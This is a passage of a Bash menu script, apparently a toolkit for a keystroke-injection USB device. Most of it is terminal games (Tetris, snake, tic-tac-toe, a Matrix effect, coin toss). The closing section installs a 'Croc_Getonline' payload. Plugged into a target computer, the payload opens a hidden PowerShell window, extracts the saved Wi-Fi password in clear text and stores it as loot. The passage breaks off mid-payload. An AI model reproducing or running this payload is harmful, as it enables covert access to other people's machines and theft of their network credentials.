		# ternary assignment: if help_on is 1 use string as is, otherwise substitute all characters with spaces
		((help_on == 1)) && s="${help[i]}" || s="${help[i]//?/ }"
		xyprint $HELP_X $((HELP_Y + i)) "$s"
}
	((help_on = -help_on))
	reset_colors
}
# this array holds all possible pieces that can be used in the game
# each piece consists of 4 cells
# each string is sequence of relative xy coordinates for different orientations
# depending on piece symmetry there can be 1, 2 or 4 orientations
piece=(
"00011011"                         # square piece
"0212223210111213"                 # line piece
"0001111201101120"                 # S piece
"0102101100101121"                 # Z piece
"01021121101112220111202100101112" # L piece
"01112122101112200001112102101112" # inverted L piece
"01111221101112210110112101101112" # T piece
)
draw_piece() {
# Arguments:
# 1 - x, 2 - y, 3 - type, 4 - rotation, 5 - cell content
	local i x y
# loop through piece cells: 4 cells, each has 2 coordinates
	for ((i = 0; i < 8; i += 2)) {
# relative coordinates are retrieved based on orientation and added to absolute coordinates
		((x = $1 + ${piece[$3]:$((i + $4 * 8 + 1)):1} * 2))
		((y = $2 + ${piece[$3]:$((i + $4 * 8)):1}))
		xyprint "$x" "$y" "$5"
}
}
next_piece=0
next_piece_rotation=0
next_piece_color=0
next_on=1 # if this flag is 1 next piece is shown
draw_next() {
# Arguments: 1 - string to draw single cell
	((next_on == -1)) && return
	draw_piece $NEXT_X $NEXT_Y $next_piece $next_piece_rotation "$1"
}
clear_next() {
	draw_next "${filled_cell//?/ }"
}
show_next() {
	set_fg "$next_piece_color"
	set_bg "$next_piece_color"
	draw_next "${filled_cell}"
	reset_colors
}
toggle_next() {
	case $next_on in
		1) clear_next; next_on=-1 ;;
		-1) next_on=1; show_next ;;
	esac
}
draw_current() {
# Arguments: 1 - string to draw single cell
# factor 2 for x because each cell is 2 characters wide
	draw_piece $((current_piece_x * 2 + PLAYFIELD_X)) $((current_piece_y + PLAYFIELD_Y)) $current_piece $current_piece_rotation "$1"
}
show_current() {
	set_fg "$current_piece_color"
	set_bg "$current_piece_color"
	draw_current "${filled_cell}"
	reset_colors
}
clear_current() {
	draw_current "${empty_cell}"
}
new_piece_location_ok() {
# Arguments: 1 - new x coordinate of the piece, 2 - new y coordinate of the piece
# test if piece can be moved to new location
	local j i x y x_test=$1 y_test=$2
	for ((j = 0, i = 1; j < 8; j += 2, i = j + 1)) {
		((y = ${piece[$current_piece]:$((j + current_piece_rotation * 8)):1} + y_test)) # new y coordinate of piece cell
		((x = ${piece[$current_piece]:$((i + current_piece_rotation * 8)):1} + x_test)) # new x coordinate of piece cell
		((y < 0 || y >= PLAYFIELD_H || x < 0 || x >= PLAYFIELD_W )) && return 1         # check if we are out of the play field
		((${play_field[y * PLAYFIELD_W + x]} != -1 )) && return 1                       # check if location is already ocupied
}
	return 0
}
get_random_next() {
# next piece becomes current
	current_piece=$next_piece
	current_piece_rotation=$next_piece_rotation
	current_piece_color=$next_piece_color
# place current at the top of play field, approximately at the center
	((current_piece_x = (PLAYFIELD_W - 4) / 2))
	((current_piece_y = 0))
# check if piece can be placed at this location, if not - game over
	new_piece_location_ok $current_piece_x $current_piece_y || cmd_quit
	show_current
	clear_next
# now let's get next piece
	((next_piece = RANDOM % ${#piece[@]}))
	((next_piece_rotation = RANDOM % (${#piece[$next_piece]} / 8)))
	((next_piece_color = RANDOM % ${#colors[@]}))
	show_next
}
draw_border() {
	local i x1 x2 y
	set_bold
	set_fg "$BORDER_COLOR"
	((x1 = PLAYFIELD_X - 2))               # 2 here is because border is 2 characters thick
	((x2 = PLAYFIELD_X + PLAYFIELD_W * 2)) # 2 here is because each cell on play field is 2 characters wide
	for ((i = 0; i < PLAYFIELD_H + 1; i++)) {
		((y = i + PLAYFIELD_Y))
		xyprint "$x1" "$y" "<|"
		xyprint "$x2" "$y" "|>"
}
	((y = PLAYFIELD_Y + PLAYFIELD_H))
	for ((i = 0; i < PLAYFIELD_W; i++)) {
		((x1 = i * 2 + PLAYFIELD_X)) # 2 here is because each cell on play field is 2 characters wide
		xyprint "$x1" "$y" '=='
		xyprint "$x1" $((y + 1)) "\/"
}
	reset_colors
}
toggle_color() {
	$no_color && no_color=false || no_color=true
	show_next
	update_score 0
	toggle_help
	toggle_help
	draw_border
	redraw_playfield
	show_current
}
init() {
	local i x1 x2 y
# playfield is initialized with -1s (empty cells)
	for ((i = 0; i < PLAYFIELD_H * PLAYFIELD_W; i++)) {
	play_field[$i]=-1
}
	clear
	hide_cursor
	get_random_next
	get_random_next
	toggle_color
}
# this function runs in separate process
# it sends DOWN commands to controller with appropriate delay
ticker() {
# on SIGUSR2 this process should exit
	trap exit SIGUSR2
# on SIGUSR1 delay should be decreased, this happens during level ups
	trap 'DELAY=$(awk "BEGIN {print $DELAY * $DELAY_FACTOR}")' SIGUSR1
	while true; do echo -n $DOWN; sleep $DELAY; done
}
# this function processes keyboard input
reader() {
	trap exit SIGUSR2 # this process exits on SIGUSR2
	trap '' SIGUSR1   # SIGUSR1 is ignored
	local -u key a='' b='' cmd esc_ch=$'\x1b'
# commands is associative array, which maps pressed keys to commands, sent to controller
	declare -A commands=([A]=$ROTATE [C]=$RIGHT [D]=$LEFT
		[_S]=$ROTATE [_A]=$LEFT [_D]=$RIGHT
		[_]=$DROP [_Q]=$QUIT [_H]=$TOGGLE_HELP [_N]=$TOGGLE_NEXT [_C]=$TOGGLE_COLOR)
	while read -s -n 1 key; do
		case "$a$b$key" in
			"${esc_ch}["[ACD]) cmd=${commands[$key]} ;; # cursor key
			*${esc_ch}${esc_ch}) cmd=$QUIT ;;           # exit on 2 escapes
			*) cmd=${commands[_$key]:-} ;;              # regular key. If space was pressed $key is empty
		esac
		a=$b   # preserve previous keys
		b=$key
		[ -n "$cmd" ] && echo -n "$cmd"
	done
}
# this function updates occupied cells in play_field array after piece is dropped
flatten_playfield() {
	local i j k x y
	for ((i = 0, j = 1; i < 8; i += 2, j += 2)) {
		((y = ${piece[$current_piece]:$((i + current_piece_rotation * 8)):1} + current_piece_y))
		((x = ${piece[$current_piece]:$((j + current_piece_rotation * 8)):1} + current_piece_x))
		((k = y * PLAYFIELD_W + x))
		play_field[$k]=$current_piece_color
}
}
# this function goes through play_field array and eliminates lines without empty sells
process_complete_lines() {
	local j i complete_lines
	((complete_lines = 0))
	for ((j = 0; j < PLAYFIELD_W * PLAYFIELD_H; j += PLAYFIELD_W)) {
		for ((i = j + PLAYFIELD_W - 1; i >= j; i--)) {
			((${play_field[$i]} == -1)) && break # empty cell found
}
			((i >= j)) && continue # previous loop was interrupted because empty cell was found
			((complete_lines++))
		# move lines down
		for ((i = j - 1; i >= 0; i--)) {
			play_field[$((i + PLAYFIELD_W))]=${play_field[$i]}
}
# mark cells as free
		for ((i = 0; i < PLAYFIELD_W; i++)) {
			play_field[$i]=-1
 }
}
	return "$complete_lines"
}
process_fallen_piece() {
	flatten_playfield
	process_complete_lines && return
	update_score $?
	redraw_playfield
}
move_piece() {
# arguments: 1 - new x coordinate, 2 - new y coordinate
# moves the piece to the new location if possible
	if new_piece_location_ok "$1" "$2"; then # if new location is ok
		clear_current                     # let's wipe out piece current location
		current_piece_x=$1                # update x ...
		current_piece_y=$2                # ... and y of new location
		show_current                      # and draw piece in new location
		return 0                          # nothing more to do here
	fi                                    # if we could not move piece to new location
	(($2 == current_piece_y)) && return 0 # and this was not horizontal move
	process_fallen_piece                  # let's finalize this piece
	get_random_next                       # and start the new one
	return 1
}
cmd_right() {
	move_piece $((current_piece_x + 1)) "$current_piece_y"
}
cmd_left() {
	move_piece $((current_piece_x - 1)) "$current_piece_y"
}
cmd_rotate() {
	local available_rotations old_rotation new_rotation
	available_rotations=$((${#piece[$current_piece]} / 8))            # number of orientations for this piece
	old_rotation=$current_piece_rotation                              # preserve current orientation
	new_rotation=$(((old_rotation + 1) % available_rotations))        # calculate new orientation
	current_piece_rotation=$new_rotation                              # set orientation to new
	if new_piece_location_ok $current_piece_x $current_piece_y; then # check if new orientation is ok
		current_piece_rotation=$old_rotation                          # if yes - restore old orientation
		clear_current                                                 # clear piece image
		current_piece_rotation=$new_rotation                          # set new orientation
		show_current                                                  # draw piece with new orientation
	else                                                              # if new orientation is not ok
		current_piece_rotation=$old_rotation                          # restore old orientation
	fi
}
cmd_down() {
	move_piece "$current_piece_x" $((current_piece_y + 1))
}
cmd_drop() {
# move piece all way down
# this is example of do..while loop in bash
# loop body is empty
# loop condition is done at least once
# loop runs until loop condition would return non zero exit code
	while move_piece $current_piece_x $((current_piece_y + 1)); do
		:
	done
}
cmd_quit() {
	showtime=false                               # let's stop controller ...
	pkill -SIGUSR2 -f "/bin/bash $0" # ... send SIGUSR2 to all script instances to stop forked processes ...
	xyprint "$GAMEOVER_X" "$GAMEOVER_Y" "Game over!"
	echo -e "$screen_buffer"                     # ... and print final message
}
controller() {
# SIGUSR1 and SIGUSR2 are ignored
	trap '' SIGUSR1 SIGUSR2
	local cmd commands
# initialization of commands array with appropriate functions
	commands[$QUIT]=cmd_quit
	commands[$RIGHT]=cmd_right
	commands[$LEFT]=cmd_left
	commands[$ROTATE]=cmd_rotate
	commands[$DOWN]=cmd_down
	commands[$DROP]=cmd_drop
	commands[$TOGGLE_HELP]=toggle_help
	commands[$TOGGLE_NEXT]=toggle_next
	commands[$TOGGLE_COLOR]=toggle_color
	init
	while $showtime; do           # run while showtime variable is true, it is changed to false in cmd_quit function
		echo -ne "$screen_buffer" # output screen buffer ...
		screen_buffer=""          # ... and reset it
		read -s -n 1 cmd          # read next command from stdout
		${commands[$cmd]}         # run command
	done
}
stty_g=`stty -g` # let's save terminal state
# output of ticker and reader is joined and piped into controller
(
	ticker & # ticker runs as separate process
	reader
)|(
	controller
)
show_cursor
stty "$stty_g" # let's restore terminal state
}
##
#----Pass time Snake
##
snake_game() {
##############################################################################
#                                                                            #
#   Author : Martin "BruXy" Bruchanov, bruxy at regnet.cz                    #
#   URL    : http://bruxy.regnet.cz                                          #
#   Version: 1.01 (Wed Jan  9 20:04:26 CET 2013)                             #
#                                                                            #
##############################################################################
local MW=$(tput cols)
local MH=$(tput lines)
local MH=$[MH-1] # bottom line is used for info and score
local CONFIG=~/.housenka
local DEFAULT_FOOD_NUMBER=2 # reset after game over in func. new_level
local FOOD_NUMBER=0
local DEATH=0
local SCORE=0
local TIMING=0.1            # delay constant, lower value => faster moves
local C=2                   # game cycle
declare -A FOOD
local _STTY=$(stty -g)      # Save current terminal setup
printf "\e[?25l"      # Turn of cursor 
printf "\e]0;HOUSENKA\007"
stty -echo -icanon
local USER=$(whoami)
local NAME=$(grep "$USER" /etc/passwd | cut -d : -f 5)
#############
# ANSI data #
#############
local GAME_OVER[0]="\e[1;35m╥┌  ╓─╖ ╥ ╥ ╥─┐ ╥─┐    ╥ ╥ ╥┐  ╥ ┬\e[0m"
local GAME_OVER[1]="\e[0;31m╟┴┐ ║ ║ ║\║ ╟┤  ║      ╟─╢ ╟┴┐ ╨╥┘\e[0m"
local GAME_OVER[2]="\e[1;31m╨ ┴ ╙─╜ ╨ ╨ ╨─┘ ╨─┘    ╨ ╨ ╨ ┴  ╨ \e[0m"
local GAME_OVER[3]="\e[0;32m╥────────────────────────────────╥\e[0m"
local GAME_OVER[4]="\e[1;32m║  Stiskni ENTER pro novou hru!  ║\e[0m"
local GAME_OVER[5]="\e[1;36m╨────────────────────────────────╨\e[0m"
#############
# FUNCTIONS #
#############
function at_exit() {
	printf "\e[?9l"          # Turn off mouse reading
	printf "\e[?12l\e[?25h"  # Turn on cursor
	stty "$_STTY"            # reinitialize terminal settings
	tput sgr0
	clear
}
function get_first() {
# Return: first index of array
	eval echo \${!$1[@]} | cut -d ' ' -f 1
}
function gen_food() {
	local x y food
	for ((i=0; i<$[2*$FOOD_NUMBER]; i++)); do
		x=$[RANDOM % (MW-2) + 2]
		y=$[RANDOM % (MH-2) + 2]
		# check if leaf position is unique
		if [ $(echo ${!FOOD[@]} | tr ' ' '\n' | grep -c "^$y;$x$") -gt 0 ]; then
			: $[i--]
			continue
		fi
		food=$[i & 1] # 0 -- poison, 1 -- leaf
		FOOD["$y;$x"]=$food
		if [ "$food" -eq 1 ]; then
			printf "\e[$y;${x}f\e[1;32m♠\e[0m";
		else
			printf "\e[$y;${x}f\e[1;31m♣\e[0m";
		fi
	done
}
function check_food() {
	local first
	# check what was eaten in garden
	if [ "${FOOD["$HY;$HX"]}" == "1" ]; then
		unset FOOD["$HY;$HX"]
		: $[FOOD_NUMBER--] $[SCORE++]
		((FOOD_NUMBER==0)) && return 
	elif [ "${FOOD["$HY;$HX"]}" == "0" ]; then
		DEATH=1
	else
		first=$(get_first HOUSENKA)
		printf "\e[${HOUSENKA[$first]}f "
		unset HOUSENKA[$first]
	fi
	# do not break into wall
	if [ "$HY" -le 1 ] || [ "$HY" -ge "$MH" ] || [ "$HX" -le 1 ] || [ "$HX" -ge "$MW" ]; then
		DEATH=2
	fi
	# check if Housenka does not bite herself
	if [ ! -z "$KEY" -a $C -gt 4 ]; then
		local last
		last=${#HOUSENKA[@]}
		if [ "$(echo "${HOUSENKA[@]}" | tr ' ' '\n' | \
			head -n $[last-2] | grep -c "^$HY;$HX$")" -gt 0 ]; then
			DEATH=3
		fi
	fi
}
function game_over() {
	trap : ALRM # disable interupt
	printf "\a"
	centered_window 34 "${#GAME_OVER[@]}" GAME_OVER 
	if [ "$SCORE" -gt "$TOP_SCORE" ]; then
		echo "$SCORE" > "$CONFIG"
		TOP_SCORE=$SCORE
	fi
	read
	DEATH=0 SCORE=0 DEFAULT_FOOD_NUMBER=2
	new_level
}
function centered_window() {
	# $1 width $2 height $3 content
	w=$1 h=$2
	x=$[(MW-w)/2]
	y=$[(MH-h)/2]
	ul=$y";"$x
	bl=$[y+h+1]";"$x
	printf "\e[${ul}f┌"; printf '─%.0s' "$(eval echo {1.."$w"})"; printf '┐\n'
	for i in $(eval echo "{0.."$h"}"); do 
		printf "\e[$[y+i+1];${x}f│";
		echo -en "$(eval printf \"%s\" \"\${"$3"[\$i]}\")"
		printf "\e[$[y+i+1];$[x+w+1]f│";
	done
	printf "\e[${bl}f└"; printf '─%.0s' "$(eval echo {1.."$w"})"; printf '┘\n'
}
function move() {
	check_food
	if [ $DEATH -gt 0 ]; then game_over; fi
	if [ $FOOD_NUMBER -eq 0 ]; then new_level; fi
	echo -en "\e[$HY;${HX}f\e[1;33;42m☻\e[0m"
	( sleep $TIMING; kill -ALRM $$ ) &
	case "$KEY" in
		A) HY=$[HY-1] ;; # Up
		B) HY=$[HY+1] ;; # Down
		C) HX=$[HX+1] ;; # Right
		D) HX=$[HX-1] ;; # Left
	esac
	HOUSENKA[$C]="$HY;$HX"
	: $[C++]
	game_info
}
function draw_area() {
	# draw play area
	printf "\e[31m"
	local x y o="█"
	for ((x=0;x<=$MW;x++)); do
		printf  "\e[1;${x}f$o\e[$MH;${x}f$o"
		sleep 0.005
	done
	for ((y=0;y<=$MH;y++)); do
		printf "\e[${y};1f$o\e[${y};${MW}f$o"
		sleep 0.01
	done
}
function new_level() {
	unset HOUSENKA
	for i in ${!FOOD[@]}; do unset FOOD[$i]; done # erase leaves and poison
	clear
	draw_area
	FOOD_NUMBER=$[DEFAULT_FOOD_NUMBER*=2]
	gen_food
	HX=$[MW/2] HY=$[MH/2]  # start position in the middle of the screen
	# body initialization
	HOUSENKA=([0]="$[HY-2];$HX" [1]="$[HY-1];$HX" [2]="$HY;$HX")
	KEY=''
	C=2
	trap move ALRM
}
	function title_screen() {
TITLE="QlpoOTFBWSZTWWMw1D8AAnd//X38AIhAA/24Cg2UCD7H13BVRH9ktkYEBAgAEABQ
BHgAEQBSlBJEQhqaA0ZDQBoA0ABpoBo9Rk0Ghw00wQyGmmRkwgGmgDCaNMmABA0E
KRJCTTIDIAAAAAyBkNDQNNHqHDTTBDIaaZGTCAaaAMJo0yYAEDQ4aaYIZDTTIyYQ
DTQBhNGmTAAgadZFPhSv08GL4IDbz4ctYPMQnUncHF0csCYaeprXNsFiBI3jqAqr
eZINIEZYBM0vKFjDLrT3O9d7u0YdyNmszDTqrCoaow3YRJGmq1mpO9ZAbqoXLRBc
sNPFvNGSbnbbDlhVhwUxhQ2lyXlxhssjLVysN8tVGpyiODkVooK4kzcZBVBBouKq
K4k3RKUuppicgMDWCYG23aU3vWmMOHN8HBjaSTYb43vjg4bTqDizjjW5iojfdt7O
DhnoedhCmSaWgoUq6IyuzGTVFAUs66ujrbwJmIp54zi8U0Jvl2dG7jlOcZy0IU8Q
HY32Ojyejm45lswDjSi5KwUwUUlAIQ01SRKUtKU1Hjwg4A7BIMFZ3MMYMQHc2nHg
Fi88aPlyBeYkZTTyRgUml+nl5p3CxSMeGHDUCBTstZpOZckIU8f7lIckxlKZ53hT
YzK0p+YzytGd2hNg2ZCrUpkv09fqowZ9vLuiQCDnIRUPoBDAIVRIZkQO0AKOpQ0o
msRVHATFQU7vc7/1AfWSlJFEkFIrRKQUlVRCSlVNUlLQDMCxBAlAlIkEQTMFMkTM
KkKVBJARFVEBD9hI9tR52USwDECnHMMIoyMqxgMsg0BodaBnMaMbCUaR1ZLkoYFR
EgUFAFNBEoxRgYJqQNQg9r4/g7vn+99/Gsj4bVxAAJfFf177dEjRn5b+cAhI82SQ
jRPNoFhdnAMJcvMkDUJEOiRqlRWaGSUhKgJZGIkiEkGS/jv9e9m2vitRmRjm0T38
FrpAS4kkIYQliBkCQnEYYP80AEjqXFAyVSw1tRWIFcZFUcAwaeljJUjJfQ8Ph9X1
Q+3t/mIXWLjCLuLwg1WEYiUo038wzoqSHpSaSOKUde7LhfHRdQzqlxs3rJKmOROc
o6Y6ZDm+THkzMzIdPXzUOo4RVH/xdyRThQkGMw1D8A=="
		SCR=`echo "$TITLE" | base64 -d | bzcat` #unpack main screen
		local i j IFS=$'\n'
		clear
		# center on screen
		for ((j=0;j<$[(MH-25)/2];j++)); do echo; done
		for i in $SCR; do
		for ((j=0;j<$[(MW-63)/2];j++)); do echo -n " "; done
		printf "%s\n" "$i"
	done
	read
}
function game_info() {
	printf "\e[$[MH+1];0fHráč: $USER (Nejlepší výkon: $TOP_SCORE)"
	printf "\e[$[MH+1];$[MW-12]fSkóre: %5d" $SCORE
}
########
# MAIN #
########
	exec 2>/dev/null
	trap at_exit ERR EXIT 
	if [ -f $CONFIG ]; then
		TOP_SCORE=$(cat $CONFIG)
	else
		TOP_SCORE=0
	fi
	title_screen
	new_level
	move
	while : ; do
		read -rsn3 -d '' PRESS
		KEY=${PRESS:2}
	done
}
##
#----Pass time Matrix effect
##
matrix_effect() {
	local N_LINE=$(( $(tput lines) - 1))
	local N_COLUMN=$(tput cols)
get_char() {
	RANDOM_U=$(echo $(( (RANDOM % 9) + 0)))
	RANDOM_D=$(echo $(( (RANDOM % 9) + 0)))
	CHAR_TYPE="\u04"
	printf "%s" "$CHAR_TYPE$RANDOM_D$RANDOM_U"
}
cursor_position() {
	echo "\033[$1;${RANDOM_COLUMN}H"
}
write_char() {
	CHAR=$(get_char)
	print_char "$1" "$2" "$CHAR"
}
erase_char() {
	CHAR="\u0020"
	print_char "$1" "$2" "$CHAR"
}
print_char() {
	CURSOR=$(cursor_position "$1")
	echo -e "$CURSOR$2$3"
}
draw_line() {
	local RANDOM_COLUMN=$[RANDOM%N_COLUMN]
	local RANDOM_LINE_SIZE=$(echo $(( (RANDOM % $N_LINE) + 1)))
	local COLOR="\033[32m"
	local COLOR_HEAD="\033[37m"
	for i in $(seq 1 $N_LINE ); do
		if [ $broken -eq 1 ]; then
			break
		else
			write_char "$[i-1]" "$COLOR"
			write_char "$i" "$COLOR_HEAD"
			#sleep 0.05
			if [ "$i" -ge "$RANDOM_LINE_SIZE" ]; then
				erase_char "$[i-RANDOM_LINE_SIZE]"
			fi
		fi
	done &
	for i in $(seq "$[i-$RANDOM_LINE_SIZE]" $N_LINE); do
		if [ "$broken" -eq 1 ]; then
			break
		else
			erase_char "$i"
			#sleep 0.05
		fi
	done
}
	tput setab 000
	clear
	reset_broken
	while [ "$broken" -eq 1 ] && break || : ; do
		draw_line
		sleep 0.3
	done
}
##
#----Pass time Game of tic-tac-toe
##
tac_toe() {
local cell_w=10
local line_seg="---------"
local line="  ""$line_seg""|""$line_seg""|""$line_seg"
local reset="\033[0m"
local player_1_str=$green"Human"$reset
local player_2_str=$blue"Computer"$reset
local positions=(- - - - - - - - -)  # initial positions
local player_one=true  # player switch init
local game_finished=false  # is the game finished
local stall=false  # stall - if an invalid or empty move was input
# functions that draws instructions and board based on positions arr
function draw_board() {
	clear
	name=$1[@]  # passing an array as argument
	positions=("${!name}")
	# first lines - instructions
	echo -e "\n       Q W E       _|_|_\n        A S D   →   | | \n         Z X C     ‾|‾|‾\n\n"
	for (( row_id=1; row_id<=3; row_id++ )); do
		# row
		row="  "
		empty_row="  "
		for (( col_id=1; col_id<$(($cell_w*3)); col_id++ )); do
		# column
		# every 10th is a separator
			if [[ $(( $col_id%$cell_w )) == 0 ]]; then
				row=$row"|"
				empty_row=$empty_row"|"
			else
				if [[ $(( $col_id%5 )) == 0 ]]; then  # get the center of the tile
					x=$(($row_id-1))
					y=$((($col_id - 5) / 10))
					if [[ $x == 0 ]]; then
						what=${positions[$y]}
				elif [[ $x == 1 ]]; then
					what=${positions[(($y+3))]}
				else
					what=${positions[(($y+6))]}
				fi
				# if it's "-", it's empty
				if [[ $what == "-" ]]; then what=" "; fi
					if [[ $what == "X" ]]; then  # append to row
						row=$row$green$what$reset
					else
						row=$row$blue$what$reset
					fi
					empty_row=$empty_row" "  # advance empty row
				else  # not the center - space
					row=$row" "
					empty_row=$empty_row" "
				fi
			fi
		done
		echo -e "$empty_row""\n""$row""\n""$empty_row"  # row is three lines high
		if [[ $row_id != 3 ]]; then
			echo -e "$line"
		fi
	done
	echo -e "\n"
}
# function that displays the prompt based on turn, reads the input and advances the game
function read_move() {
	positions_str=$(printf "%s" "${positions[@]}")
	test_position_str "$positions_str"  # finish the game if all postiions have been taken or a player has won
	if [ "$game_finished" = false ]; then
		if [ "$stall" = false ]; then
			if [ "$player_one" = true ]; then
			prompt="Your move, $player_1_str ?"
			fi
		else
			stall=false
		fi
		if [ "$player_one" = true ]; then
			echo -e "$prompt"
			read -d'' -s -n1 input  # read input
			index=10  # init with nonexistent
			case $input in
				q) index=0;;
				a) index=3;;
				z) index=6;;
				w) index=1;;
				s) index=4;;
				x) index=7;;
				e) index=2;;
				d) index=5;;
				c) index=8;;
			esac
			if [ "${positions["$index"]}" == "-" ]; then
				positions["$index"]="X"
				player_one=false
			else
				stall=true  # prevent player switch
			fi
		else
			# computer, choose your position!
			set_next_avail_pos_index "O"
			player_one=true
		fi
		init_game  # reinit, because positions persist
	fi
}
function init_game() {
	draw_board positions
	read_move
}
function end_game() {
	game_finished=true
	draw_board positions
}
function test_position_str() {
	rows=${1:0:3}" "${1:3:3}" "${1:6:8}
	cols=${1:0:1}${1:3:1}${1:6:1}" "${1:1:1}${1:4:1}${1:7:1}" "${1:2:1}${1:5:1}${1:8:1}
	diagonals=${1:0:1}${1:4:1}${1:8:1}" "${1:2:1}${1:4:1}${1:6:1}
	if [[ $rows =~ [X]{3,} || $cols =~ [X]{3,} || $diagonals =~ [X]{3,} ]]; then
		end_game
		echo -e "$player_1_str wins! \n"
		return
	fi
	if [[ $rows =~ [O]{3,} || $cols =~ [O]{3,} || $diagonals =~ [O]{3,} ]]; then
		end_game
		echo -e "$player_2_str wins! \n"
		return
	fi
	if [[ ! $positions_str =~ [-] ]]; then
		end_game
		echo -e "End with a $pinkdraw$reset\n"
	fi
}
# get next available position and set it to value of argument
function set_next_avail_pos_index() {
	available=()
	for (( i = 0; i < ${#positions[@]}; i++ )); do
		if [[ ${positions[$i]} == '-' ]]; then
			available+=($i)
		fi
	done
rand=$(jot -r 1 0 $(( ${#available[@]}-1 )))  # random in range 0 to available_len
positions[${available[$rand]}]=$1
}
init_game
}
##
#----Heads or tails game
##
Heads_Tails() {
	Info_Screen '-Simple Heads or tails game'
	read_all '[H] HEADS OR [T] TAILS AND PRESS [ENTER]'
	case "$r_a" in
		[Hh]) ColorYellow "You have chosen $(ColorGreen 'HEADS')\n" ; local user_choice="HEADS" ;;
		[Tt]) ColorYellow "You have chosen $(ColorGreen 'TAILS')\n" ; local user_choice="TAILS" ;;
		*) ColorYellow 'Defaulting to HEADS\n' ; local user_choice="HEADS" ;;
	esac
local minsteps=6
local maxsteps=10
local frames=('  |  ' ' ( ) ' '( S )')
local sides=(HEADS TAILS)
local side=$(( RANDOM % 2 ))
for (( step = 0; step < maxsteps; step++ )); do
	for (( frame = 0; frame < 3; frame++ )); do
		if (( frame == 2 )); then
			f=${frames[frame]/S/${sides[side]}}
			(( side ^= 1 ))
		else
			f=${frames[frame]/S/${sides[side]}}
			(( side ^= 2 ))
		fi
		echo -ne "\e[3$(( RANDOM * 6 / 32767 +1 ))m${f}${clear}\033[0K\r"
		if (( frame == 2 && step > minsteps && RANDOM > 16383 )); then
			break 2
		fi
		sleep 0.125
	done
done
	if [ "${sides[side]}" == TAILS ] && [ $user_choice = HEADS ]; then
		(( h++ ))
		ColorGreen "\nYOU WIN$(ColorYellow ' COUNT: ')$(ColorGreen "$h")\n"
	elif [ "${sides[side]}" == HEADS ] && [ $user_choice = TAILS ]; then
		(( t++ ))
		ColorGreen "\nYOU WIN$(ColorYellow ' COUNT: ')$(ColorGreen "$t")\n"
	else
		(( x++ ))
		ColorRed "\nYOU LOSE$(ColorYellow ' COUNT: ')$(ColorGreen "$x")\n"
	fi
	read_all 'PLAY AGAIN Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			Heads_Tails ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ; unset h t x ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Pass time Menu
##
	MenuTitle 'PASS TIME GAMES'
	MenuColor 19 1 'CHESS'
	MenuColor 19 2 'TETRIS'
	MenuColor 19 3 'SNAKE'
	MenuColor 19 4 'MATRIX'
	MenuColor 19 5 'TIC-TAC-TOE'
	MenuColor 19 6 'HEADS OR TAILS'
	MenuColor 19 7 'RETURN TO MAIN MENU'
	MenuEnd 18
	case "$m_a" in
		1) chess_game ; pass_time ;;
		2) tetris_game ; pass_time ;;
		3) snake_game ; pass_time ;;
		4) matrix_effect ; pass_time ;;
		5) tac_toe ; pass_time ;;
		6) Heads_Tails ; pass_time ;;
		7) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; pass_time ;;
		[pP]) Panic_button ;; [bB]) croc_pot_plus ;; *) invalid_entry ; pass_time ;;
	esac
}
##
#----Croc Pot Plus Install payloads
##
function install_payloads_menu() {
	Info_Screen '-Select which Payload to install and/or run from terminal
-For some payloads to work properly will need to
run Croc_Pot_Payload.txt first to get OS detection

When running payload from terminal Recommended to run on remote terminal'
ColorYellow "CURRENTLY INSTALLED PAYLOADS: $(ColorGreen "$(ls /root/udisk/payloads | grep -c ".txt")")\n"
for file_path in $(find "/root/udisk/payloads" -maxdepth 1 -type f); do
	ColorCyan "\t$(basename "$file_path")$clear\n"
done ; echo -ne "\n"
##
#----Croc_Getonline Payload Function
##
get_online_payload() {
	local CROC_GETONLINE=/root/udisk/payloads/Croc_getonline.txt
	Info_Screen '-Payload Called Croc_GetOnline
-Attempt to connect Keycroc automatically to target wifi access point

-After install unplug and plug into target and type in anywhere
getonline_W <-- MATCH word for windows
getonline_L <-- MATCH word for Linux
getonline_R <-- MATCH word for Raspberry pi

-When done the led will light up green
-The keycroc should now be connected to the target wifi access point'
##
#----install Croc_Getonline payload
##
if [ -f "$CROC_GETONLINE" ]; then
	cat "$CROC_GETONLINE" ; echo -ne "\n$LINE\n"
	ColorGreen "CROC_GETONLINE PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER$clear\n"
else
	read_all 'INSTALL CROC_GETONLINE PAYLOAD Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			echo -ne "# Title:           Croc_Getonline\n# Description:     Attempt to connect Keycroc automatically to target wifi access point\n#                  Save to tools/Croc_Pot/wifipass.txt and loot/Croc_Pot/old_wifipass.txt\n# Author:          spywill\n# Version:         3.6\n# Category:        Key Croc\n# Props:           Cribbit, Lodrix, potong, RootJunky, dark_pyrro\n
MATCH (getonline_W|getonline_R|getonline_L)\n\nCROC_POT_DIR=(/root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot)\nfor dir in \"\${CROC_POT_DIR[@]}\"; do [[ ! -d \"\$dir\" ]] && mkdir \"\$dir\" || LED B; done\n\nwifi_pass=/root/udisk/tools/Croc_Pot/wifipass.txt\n\nif [ -f \$wifi_pass ]; then\n	cat \$wifi_pass >> /root/udisk/loot/Croc_Pot/old_wifipass.txt
	rm -f \$wifi_pass\nfi\n\nATTACKMODE HID STORAGE\nQ DELAY 5000\nLED ATTACK\n\ncase \$LOOT in\n	getonline_W)\n		Q GUI r\n		Q DELAY 3000\n		Q STRING \"powershell -NoP -NonI -W Hidden\"\n		Q ENTER\n		Q DELAY 5000\n		Q STRING \"\\\$MOUNT_POINT = (Get-WmiObject -Class win32_volume -Filter 'label=\\\"KeyCroc\\\"').DriveLetter\"
		Q ENTER\n		Q DELAY 3000\n		Q STRING \"\\\$currentSSID = (netsh wlan show interfaces | Select-String \\\"SSID\\\")[0].ToString().Trim() -replace 'SSID\s+:\s+'\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"\\\$lastObject = (netsh wlan show profile name=\\\"\\\$currentSSID\\\" key=clear) | Select-String \\\"Key Content\W+:(.+)\\\$\\\" | ForEach-Object {\\\$pass=\\\$_.Matches.Groups[1].Value.Trim(); \\\$_} | ForEach-Object {[PSCustomObject]@{ PROFILE_NAME=\\\$currentSSID;PASSWORD=\\\$pass }} | Select-Object -Last 1\"
